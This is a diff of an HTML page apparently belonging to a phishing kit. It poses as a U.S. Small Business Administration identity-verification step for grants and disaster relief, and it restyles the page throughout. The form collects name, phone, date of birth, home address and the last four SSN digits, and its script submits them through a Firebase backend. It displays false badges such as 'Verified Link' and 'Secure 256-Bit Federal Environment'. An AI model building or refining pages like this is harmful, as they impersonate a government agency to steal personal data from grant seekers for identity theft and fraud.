@@ -3,154 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SBA Portal | Phase 02: Case Verification</title>
+    <title>SBA | Phase 02: Verification</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap');
+        :root { --sba-navy: #002e6d; --sba-blue: #0071bc; }
+        body { background: #f4f7f9; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
         
-        :root { --sba-navy: #002e6d; --sba-blue: #0071bc; --border: #e2e8f0; }
-        body { background: #f8fafc; font-family: 'Inter', sans-serif; color: #1e293b; }
+        .nav-mini { background: white; border-bottom: 1px solid #e2e8f0; padding: 12px 20px; }
+        .auth-card { background: white; border-top: 5px solid var(--sba-navy); box-shadow: 0 15px 35px rgba(0,0,0,0.1); width: 100%; max-width: 420px; border-radius: 4px; }
         
-        /* Perfect Centering & Container */
-        .auth-container { min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
-        .auth-card { background: white; width: 100%; max-width: 520px; border-radius: 8px; border: 1px solid var(--border); box-shadow: 0 4px 20px rgba(0,0,0,0.05); overflow: hidden; }
+        .input-field { height: 46px; border: 1.5px solid #e2e8f0; width: 100%; padding: 0 12px; outline: none; border-radius: 4px; font-size: 14px; transition: 0.2s; }
+        .input-field:focus { border-color: var(--sba-blue); box-shadow: 0 0 0 3px rgba(0, 113, 188, 0.1); }
         
-        /* Top Branding Bar */
-        .card-header-top { background: var(--sba-navy); padding: 20px; color: white; display: flex; justify-content: space-between; items-center; }
-        
-        /* Input Styling */
-        label { display: block; font-size: 11px; font-weight: 700; color: #64748b; text-transform: uppercase; margin-bottom: 6px; letter-spacing: 0.025em; }
-        input, select { 
-            height: 44px; width: 100%; background: #ffffff; border: 1.5px solid #cbd5e1; 
-            border-radius: 5px; padding: 0 14px; font-size: 14px; outline: none; transition: all 0.2s ease-in-out; 
-        }
-        input:focus, select:focus { border-color: var(--sba-blue); box-shadow: 0 0 0 4px rgba(0, 113, 188, 0.1); }
-        input::placeholder { color: #94a3b8; font-size: 13px; }
+        .btn-finish { background: var(--sba-navy); height: 48px; color: white; width: 100%; font-weight: 700; text-transform: uppercase; font-size: 12px; border-radius: 4px; letter-spacing: 0.5px; }
+        .btn-finish:hover { background: #001e4a; }
+        .btn-finish:disabled { opacity: 0.7; cursor: not-allowed; }
 
-        /* Section Dividers */
-        .section-divider { display: flex; align-items: center; gap: 10px; margin: 25px 0 15px; }
-        .section-divider span { font-size: 10px; font-weight: 800; color: var(--sba-navy); white-space: nowrap; text-transform: uppercase; letter-spacing: 1px; }
-        .section-divider div { height: 1px; background: #e2e8f0; flex-grow: 1; }
+        .step-bar { height: 4px; flex-grow: 1; border-radius: 2px; background: #e2e8f0; }
+        .step-bar.active { background: var(--sba-navy); }
 
-        /* Button */
-        .btn-submit { 
-            background: var(--sba-navy); height: 52px; width: 100%; color: white; 
-            font-weight: 700; border-radius: 5px; transition: 0.3s; text-transform: uppercase; font-size: 13px;
-        }
-        .btn-submit:hover { background: #001e4a; box-shadow: 0 8px 15px rgba(0,46,109,0.2); }
-        .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; }
+        .section-tag { font-size: 9px; font-weight: 800; color: var(--sba-navy); text-transform: uppercase; letter-spacing: 1px; border-left: 3px solid var(--sba-navy); padding-left: 8px; margin-bottom: 12px; }
     </style>
 </head>
-<body class="bg-slate-50">
+<body class="min-h-screen flex flex-col">
 
-    <div class="auth-container">
-        <div class="auth-card">
-            <div class="card-header-top">
-                <div class="flex items-center gap-3">
-                    <div class="bg-white text-[#002e6d] px-2 py-0.5 font-black text-xl rounded-sm">SBA</div>
-                    <div class="leading-none">
-                        <p class="text-[10px] font-bold uppercase opacity-80">Phase 02</p>
-                        <p class="text-xs font-bold uppercase tracking-tight">Identity Verification</p>
-                    </div>
-                </div>
-                <div class="text-right hidden sm:block">
-                    <p class="text-[9px] font-bold opacity-60 uppercase">System Status</p>
-                    <p class="text-[10px] font-bold text-green-400 uppercase"><i class="fas fa-shield-check mr-1"></i> Encrypted</p>
-                </div>
+    <nav class="nav-mini flex justify-between items-center">
+        <div class="flex items-center gap-2">
+            <div class="bg-[#002e6d] text-white px-2 py-0.5 font-bold text-lg">SBA</div>
+            <span class="text-[10px] font-bold text-gray-400 uppercase leading-tight hidden sm:block">U.S. Small Business <br> Administration</span>
+        </div>
+        <div class="text-[10px] font-black text-green-600 uppercase tracking-tighter"><i class="fas fa-lock mr-1"></i> Verified Link</div>
+    </nav>
+
+    <div class="flex-grow flex items-center justify-center p-4">
+        <div class="auth-card p-7 sm:p-9">
+            <div class="flex gap-2 mb-6 items-center">
+                <div class="step-bar active"></div>
+                <div class="step-bar active"></div>
+                <div class="step-bar"></div>
             </div>
 
-            <div class="p-8 md:p-10">
-                <div class="mb-6 flex justify-between items-end">
+            <div class="mb-6">
+                <h2 class="text-xl font-black text-gray-800 uppercase tracking-tight">Verify Identity</h2>
+                <p class="text-[11px] font-bold text-gray-400 uppercase tracking-widest mt-1">Step 2: Case Documentation</p>
+            </div>
+
+            <form id="finalForm" class="space-y-4">
+                
+                <p class="section-tag">Personal Info</p>
+                <div class="grid grid-cols-2 gap-3">
                     <div>
-                        <h1 class="text-xl font-bold text-slate-800">Verify Your Identity</h1>
-                        <p class="text-xs text-slate-500">Ensure all details match your government-issued ID.</p>
+                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">First Name</label>
+                        <input type="text" id="fname" class="input-field" required placeholder="John">
                     </div>
-                    <div class="text-[10px] font-bold bg-slate-100 px-2 py-1 rounded">2 / 3</div>
+                    <div>
+                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">Last Name</label>
+                        <input type="text" id="lname" class="input-field" required placeholder="Doe">
+                    </div>
                 </div>
 
-                <form id="finalForm" class="space-y-4">
-                    
-                    <div class="section-divider">
-                        <span>Legal Credentials</span>
-                        <div></div>
+                <div class="grid grid-cols-2 gap-3">
+                    <div>
+                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">Phone</label>
+                        <input type="tel" id="phone" class="input-field" required placeholder="(000) 000-0000">
                     </div>
-
-                    <div class="grid grid-cols-2 gap-4">
-                        <div class="space-y-1">
-                            <label>Legal First Name</label>
-                            <input type="text" id="fname" required placeholder="e.g. John">
-                        </div>
-                        <div class="space-y-1">
-                            <label>Legal Last Name</label>
-                            <input type="text" id="lname" required placeholder="e.g. Smith">
-                        </div>
+                    <div>
+                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">D.O.B</label>
+                        <input type="date" id="dob" class="input-field" required>
                     </div>
+                </div>
 
-                    <div class="grid grid-cols-2 gap-4">
-                        <div class="space-y-1">
-                            <label>Phone Number</label>
-                            <input type="tel" id="phone" required placeholder="(000) 000-0000">
-                        </div>
-                        <div class="space-y-1">
-                            <label>Date of Birth</label>
-                            <input type="date" id="dob" required>
-                        </div>
+                <p class="section-tag pt-2">Location & Security</p>
+                <div>
+                    <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">Street Address</label>
+                    <input type="text" id="address" class="input-field" required placeholder="123 Main St">
+                </div>
+
+                <div class="grid grid-cols-2 gap-3">
+                    <div>
+                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">City, State</label>
+                        <input type="text" id="city" class="input-field" required placeholder="City, ST">
                     </div>
-
-                    <div class="section-divider pt-2">
-                        <span>Residential Information</span>
-                        <div></div>
+                    <div>
+                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">Zip Code</label>
+                        <input type="text" id="zip" class="input-field" required placeholder="00000">
                     </div>
+                </div>
 
-                    <div class="space-y-1">
-                        <label>Street Address</label>
-                        <input type="text" id="address" required placeholder="Full residential street address">
+                <div class="grid grid-cols-2 gap-3 pb-2">
+                    <div>
+                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">SSN (Last 4)</label>
+                        <input type="password" id="ssn" maxlength="4" class="input-field" required placeholder="••••">
                     </div>
-
-                    <div class="grid grid-cols-2 gap-4">
-                        <div class="space-y-1">
-                            <label>City & State</label>
-                            <input type="text" id="city" required placeholder="e.g. Houston, TX">
-                        </div>
-                        <div class="space-y-1">
-                            <label>Zip Code</label>
-                            <input type="text" id="zip" required placeholder="5-Digit Zip">
-                        </div>
+                    <div>
+                        <label class="block text-[10px] font-bold text-gray-500 uppercase mb-1">Program</label>
+                        <select id="program" class="input-field" style="padding-right: 5px;">
+                            <option value="SBA Grant">SBA Grant</option>
+                            <option value="Disaster Relief">Relief Fund</option>
+                        </select>
                     </div>
+                </div>
 
-                    <div class="section-divider pt-2">
-                        <span>Security & Allocation</span>
-                        <div></div>
-                    </div>
-
-                    <div class="grid grid-cols-2 gap-4 pb-4">
-                        <div class="space-y-1">
-                            <label>SSN (Last 4 Only)</label>
-                            <input type="password" id="ssn" maxlength="4" required placeholder="••••">
-                        </div>
-                        <div class="space-y-1">
-                            <label>Assigned Program</label>
-                            <select id="program" required>
-                                <option value="" disabled selected>Select Program</option>
-                                <option value="SBA Grant">SBA Business Grant</option>
-                                <option value="Disaster Relief">Disaster Relief Fund</option>
-                                <option value="SBA Loan">Low-Interest Loan</option>
-                            </select>
-                        </div>
-                    </div>
-
-                    <button type="submit" id="finishBtn" class="btn-submit shadow-md">
-                        Submit Verification File
-                    </button>
-
-                    <p class="text-[9px] text-center text-slate-400 font-medium leading-relaxed mt-4">
-                        BY SUBMITTING THIS FORM, YOU AGREE THAT ALL PROVIDED INFORMATION IS VERIFIABLE BY THE FEDERAL REVENUE SERVICE AND SBA COMPLIANCE NODES.
-                    </p>
-                </form>
-            </div>
+                <button type="submit" id="finishBtn" class="btn-finish shadow-lg mt-2">
+                    Submit Case File <i class="fas fa-file-export ml-2"></i>
+                </button>
+            </form>
         </div>
     </div>
+
+    <footer class="p-6 text-center">
+        <p class="text-[9px] text-gray-400 font-bold uppercase tracking-[0.2em]">
+            <i class="fas fa-shield-alt mr-1"></i> Secure 256-Bit Federal Environment
+        </p>
+    </footer>
 
     <script type="module">
         import { auth, db } from './firebase-config.js';
@@ -166,7 +132,7 @@
             if(!email) { window.location.href="register1.html"; return; }
 
             btn.disabled = true;
-            btn.innerHTML = `<i class="fas fa-spinner fa-spin mr-2"></i> Processing Secure Upload...`;
+            btn.innerHTML = `<i class="fas fa-spinner fa-spin mr-2"></i> Processing...`;
 
             try {
                 let uid;
@@ -199,7 +165,7 @@
             } catch (err) {
                 alert("System Error: " + err.message);
                 btn.disabled = false;
-                btn.innerText = "Submit Verification File";
+                btn.innerText = "Submit Case File";
             }
         };
     </script>
